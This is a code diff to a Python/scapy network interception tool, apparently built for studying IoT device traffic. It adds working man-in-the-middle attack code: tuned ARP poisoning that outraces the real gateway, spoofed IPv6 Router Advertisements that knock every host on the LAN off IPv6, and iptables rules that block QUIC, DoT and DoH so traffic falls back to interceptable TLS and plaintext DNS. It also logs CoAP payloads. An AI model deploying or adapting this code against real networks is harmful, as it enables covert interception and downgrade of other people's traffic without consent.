@@ -10,9 +10,24 @@ from dataclasses import dataclass
 from pathlib import Path
 from typing import Callable
 
-from scapy.all import ARP, DNS, IP, IPv6, PcapWriter, Raw, TCP, UDP, Ether, get_if_hwaddr, sendp, sniff, srp  # type: ignore
+from scapy.all import (  # type: ignore
+    ARP, DNS, ICMPv6ND_RA, ICMPv6ND_RS, ICMPv6NDOptPrefixInfo, IP, IPv6,
+    PcapWriter, Raw, TCP, UDP, Ether, get_if_hwaddr, sendp, sniff, srp,
+)
 
-from .tlshello import looks_tls, parse_client_hello
+from .coap import parse_coap
+from .tlshello import dtls_version, looks_dtls_client_hello, looks_tls, parse_client_hello
+
+# Well-known DNS-over-HTTPS resolver IPs. Dropping TCP/443 to these forces the
+# device to fall back to plaintext :53 (which our DNS responder then owns).
+DOH_IPS = [
+    "1.1.1.1", "1.0.0.1", "1.1.1.2", "1.0.0.2",        # Cloudflare
+    "8.8.8.8", "8.8.4.4",                                # Google
+    "9.9.9.9", "149.112.112.112",                        # Quad9
+    "94.140.14.14", "94.140.15.15",                      # AdGuard
+    "208.67.222.222", "208.67.220.220",                  # OpenDNS
+    "185.228.168.9",                                      # CleanBrowsing
+]
 
 
 @dataclass
@@ -79,20 +94,56 @@ class ArpSpoofer:
     def start(self):
         self.thread = threading.Thread(target=self._loop, daemon=True)
         self.thread.start()
+        self.responder = threading.Thread(target=self._respond_loop, daemon=True)
+        self.responder.start()
 
     def restore(self):
         self.stop.set()
         if self.thread:
             self.thread.join(timeout=1)
+        responder = getattr(self, "responder", None)
+        if responder:
+            responder.join(timeout=1)
         for _ in range(3):
             self._send_arp(self.env.gateway_ip, self.env.gateway_mac, self.env.target_ip, "ff:ff:ff:ff:ff:ff")
             self._send_arp(self.env.target_ip, self.env.target_mac, self.env.gateway_ip, "ff:ff:ff:ff:ff:ff")
 
+    def _respond_loop(self):
+        """Answer ARP who-has for the gateway/target instantly.
+
+        Periodic gratuitous replies can lose the race against the real gateway
+        (especially right after a neighbor-table flush); replying directly to the
+        request wins deterministically and keeps the poisoning sticky.
+        """
+        def cb(pkt):
+            if ARP not in pkt or pkt[ARP].op != 1:  # who-has only
+                return
+            tgt, src = pkt[ARP].pdst, pkt[ARP].psrc
+            if tgt == self.env.gateway_ip and src == self.env.target_ip:
+                self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
+            elif tgt == self.env.target_ip and src == self.env.gateway_ip:
+                self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
+        try:
+            sniff(iface=self.env.iface, filter="arp", prn=cb, store=False, stop_filter=lambda _: self.stop.is_set())
+        except Exception as e:
+            self.log.emit("WARN", msg="arp responder failed", error=str(e))
+
     def _loop(self):
+        # Aggressive startup burst to win the race against the legitimate gateway
+        # (and to repopulate a freshly-flushed neighbor table) before settling into
+        # a steady refresh cadence.
+        for _ in range(5):
+            if self.stop.is_set():
+                return
+            self._poison()
+            time.sleep(0.2)
         while not self.stop.is_set():
-            self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
-            self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
-            time.sleep(2)
+            self._poison()
+            time.sleep(1)
+
+    def _poison(self):
+        self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
+        self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
 
     def _send_arp(self, psrc: str, hwsrc: str, pdst: str, hwdst: str):
         pkt = ARP(op=2, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst)
@@ -103,11 +154,88 @@ class ArpSpoofer:
         sendp(Ether(src=hwsrc, dst="ff:ff:ff:ff:ff:ff") / pkt, iface=self.env.iface, verbose=False)
 
 
+def build_ra_kill(router_ll: str, router_mac: str, prefixes: list[tuple[str, int]] | None = None):
+    """A spoofed Router Advertisement that deprecates the real IPv6 router.
+
+    routerlifetime=0 tells hosts to stop using this router as a default gateway;
+    prefix lifetimes of 0 deprecate its prefixes. Sent to all-nodes (ff02::1) so
+    devices fall back to IPv4 (which our ARP spoofing covers).
+    """
+    ra = (
+        Ether(src=router_mac, dst="33:33:00:00:00:01")
+        / IPv6(src=router_ll, dst="ff02::1")
+        / ICMPv6ND_RA(routerlifetime=0, reachabletime=0, retranstimer=0)
+    )
+    for prefix, plen in (prefixes or []):
+        ra /= ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=plen, validlifetime=0, preferredlifetime=0)
+    return ra
+
+
+class IPv6Suppressor:
+    """RA-kill to force a target off IPv6 onto our IPv4 MITM path.
+
+    Aggressive and LAN-wide (RAs target ff02::1), so opt-in only. Discovers the
+    real router via a Router Solicitation, then periodically re-advertises it with
+    a zero lifetime.
+    """
+
+    def __init__(self, env: Env, log, interval: float = 5.0):
+        self.env = env
+        self.log = log
+        self.interval = interval
+        self.stop = threading.Event()
+        self.thread: threading.Thread | None = None
+        self.router_ll: str | None = None
+        self.router_mac: str | None = None
+        self.prefixes: list[tuple[str, int]] = []
+
+    def start(self):
+        self._discover()
+        self.thread = threading.Thread(target=self._loop, daemon=True)
+        self.thread.start()
+
+    def restore(self):
+        self.stop.set()
+        if self.thread:
+            self.thread.join(timeout=1)
+
+    def _discover(self):
+        try:
+            ans, _ = srp(Ether(dst="33:33:00:00:00:02") / IPv6(dst="ff02::2") / ICMPv6ND_RS(),
+                         timeout=3, iface=self.env.iface, verbose=False)
+            for _, r in ans:
+                if ICMPv6ND_RA in r:
+                    self.router_ll = r[IPv6].src
+                    self.router_mac = r[Ether].src
+                    opt = r.getlayer(ICMPv6NDOptPrefixInfo)
+                    while opt is not None:
+                        self.prefixes.append((opt.prefix, opt.prefixlen))
+                        opt = opt.payload.getlayer(ICMPv6NDOptPrefixInfo)
+                    self.log.emit("INFO", msg="ipv6 router discovered", router=self.router_ll, prefixes=len(self.prefixes))
+                    return
+            self.log.emit("WARN", msg="no ipv6 router found; suppressing with link-local fallback")
+        except Exception as e:
+            self.log.emit("WARN", msg="ipv6 router discovery failed", error=str(e))
+
+    def _loop(self):
+        mac = self.router_mac or get_if_hwaddr(self.env.iface)
+        ll = self.router_ll or "fe80::1"
+        while not self.stop.is_set():
+            try:
+                sendp(build_ra_kill(ll, mac, self.prefixes), iface=self.env.iface, verbose=False)
+            except Exception as e:
+                self.log.emit("WARN", msg="ra-kill send failed", error=str(e))
+            self.stop.wait(self.interval)
+
+
 class Netfilter:
-    def __init__(self, env: Env, port: int, redirect_ports: list[int] | None = None):
+    def __init__(self, env: Env, port: int, redirect_ports: list[int] | None = None,
+                 funnel: bool = False, dns_port: int = 0):
         self.env = env
         self.port = port
         self.redirect_ports = redirect_ports or []
+        self.funnel = funnel        # drop QUIC/DoH/DoT to force traffic into TCP+TLS
+        self.dns_port = dns_port    # >0: REDIRECT target UDP/53 to our DNS responder
         self.rules: list[list[str]] = []
 
     def enable_forwarding(self):
@@ -140,11 +268,14 @@ class Netfilter:
         self._purge_saved_rules(
             "filter",
             lambda chain, line: (chain == "INPUT" and f"--dport {self.port}" in line and "-j ACCEPT" in line)
-            or (chain == "FORWARD" and e.target_ip in line and "-j ACCEPT" in line),
+            or (chain == "FORWARD" and e.target_ip in line and "-j ACCEPT" in line)
+            or (chain == "FORWARD" and e.target_ip in line and "-j DROP" in line)
+            or (chain == "INPUT" and self.dns_port and f"--dport {self.dns_port}" in line and "-j ACCEPT" in line),
         )
         self._purge_saved_rules(
             "nat",
-            lambda chain, line: chain == "PREROUTING" and f"--to-ports {self.port}" in line and "-j REDIRECT" in line,
+            lambda chain, line: chain == "PREROUTING" and "-j REDIRECT" in line
+            and (f"--to-ports {self.port}" in line or (self.dns_port and f"--to-ports {self.dns_port}" in line)),
         )
 
     def _desired_rules(self) -> list[list[str]]:
@@ -161,7 +292,29 @@ class Netfilter:
                 rule += ["--dport", str(port)]
             rule += ["-j", "REDIRECT", "--to-ports", str(self.port)]
             rules.append(rule)
+        if self.dns_port:
+            # Accept the redirected DNS on our responder port, and steer the
+            # target's plaintext :53 to it.
+            rules.append(["iptables", "-I", "INPUT", "1", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", str(self.dns_port), "-j", "ACCEPT"])
+            rules.append(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-ports", str(self.dns_port)])
+        rules += self._funnel_rules() if self.funnel else []
         return rules
+
+    def _funnel_rules(self) -> list[list[str]]:
+        """DROP transports that bypass our TCP+TLS interception so traffic falls back to it.
+
+        Installed with -I FORWARD 1 (after the broad ACCEPTs), so they sit *above*
+        the accept rules and are evaluated first.
+        """
+        e = self.env
+        drops = [
+            ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", "443", "-j", "DROP"],   # QUIC/HTTP3
+            ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-p", "udp", "--dport", "853", "-j", "DROP"],   # DoQ
+            ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-p", "tcp", "--dport", "853", "-j", "DROP"],   # DoT
+        ]
+        for ip in DOH_IPS:
+            drops.append(["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP"])  # DoH
+        return drops
 
     @staticmethod
     def _delete_cmd(rule: list[str]) -> list[str]:
@@ -208,7 +361,7 @@ def start_dns_sniffer(env: Env, log, stop: threading.Event, include_udp: bool = 
 
     def run():
         try:
-            sniff(iface=env.iface, filter=f"host {env.target_ip}", prn=callback, store=False, stop_filter=lambda _: stop.is_set())
+            sniff(iface=env.iface, filter=f"ether host {env.target_mac} or host {env.target_ip}", prn=callback, store=False, stop_filter=lambda _: stop.is_set())
         finally:
             if writer is not None:
                 writer.close()
@@ -219,8 +372,11 @@ def start_dns_sniffer(env: Env, log, stop: threading.Event, include_udp: bool = 
 
 
 def handle_packet(pkt, env: Env, log, include_udp: bool):
+    if IPv6 in pkt and (pkt[IPv6].src == env.target_ip or pkt[IPv6].dst == env.target_ip or _from_target_mac(pkt, env)):
+        log.emit("IPV6_ESCAPE", src=pkt[IPv6].src, dst=pkt[IPv6].dst,
+                 finding="ipv6_outside_arp_scope", msg="target using IPv6; not covered by IPv4 ARP spoofing")
+        return
     if IPv6 in pkt:
-        log.emit("WARN", msg="ipv6_seen_unsupported", src=pkt[IPv6].src, dst=pkt[IPv6].dst)
         return
     if IP not in pkt or pkt[IP].src != env.target_ip:
         return
@@ -228,6 +384,10 @@ def handle_packet(pkt, env: Env, log, include_udp: bool):
         handle_tcp(pkt, log)
     elif UDP in pkt:
         handle_udp(pkt, log, include_udp)
+
+
+def _from_target_mac(pkt, env: Env) -> bool:
+    return Ether in pkt and pkt[Ether].src == env.target_mac
 
 
 def handle_tcp(pkt, log):
@@ -240,13 +400,39 @@ def handle_tcp(pkt, log):
 
 def handle_udp(pkt, log, include_udp: bool):
     dport = pkt[UDP].dport
+    sport = pkt[UDP].sport
+    payload = bytes(pkt[UDP].payload)
     if dport == 53 and DNS in pkt and pkt[DNS].qd:
         query = pkt[DNS].qd.qname.decode(errors="ignore").rstrip(".")
         log.emit("DNS", query=query, dest=pkt[IP].dst)
     elif dport == 5353 and DNS in pkt:
         handle_mdns(pkt, log)
+    elif 5683 in (dport, sport):
+        handle_coap(pkt, payload, log)
+    elif 5684 in (dport, sport):
+        handle_dtls(pkt, payload, log, include_udp)
     elif include_udp:
-        log.emit("UDP", dest=f"{pkt[IP].dst}:{dport}", proto=classify_udp(dport, bytes(pkt[UDP].payload)))
+        log.emit("UDP", dest=f"{pkt[IP].dst}:{dport}", proto=classify_udp(dport, payload))
+
+
+def handle_coap(pkt, payload: bytes, log):
+    """Passively parse plaintext CoAP (RFC 7252) we forward for the target."""
+    msg = parse_coap(payload)
+    if not msg:
+        return
+    preview = msg.payload[:256]
+    text = preview.decode("utf-8", "replace") if preview else None
+    log.emit("COAP", dest=f"{pkt[IP].dst}:{pkt[UDP].dport}", summary=msg.summary(), type=msg.type,
+             code=msg.code, method=msg.method, uri=msg.uri_path or None, query=msg.uri_query or None,
+             content_format=msg.content_format, payload=text or None)
+
+
+def handle_dtls(pkt, payload: bytes, log, include_udp: bool):
+    if looks_dtls_client_hello(payload):
+        log.emit("DTLS_CLIENTHELLO", dest=f"{pkt[IP].dst}:{pkt[UDP].dport}", version=dtls_version(payload),
+                 msg="encrypted CoAP/DTLS; payload not decrypted")
+    elif include_udp:
+        log.emit("UDP", dest=f"{pkt[IP].dst}:{pkt[UDP].dport}", proto="coap-dtls")
 
 
 def handle_mdns(pkt, log):
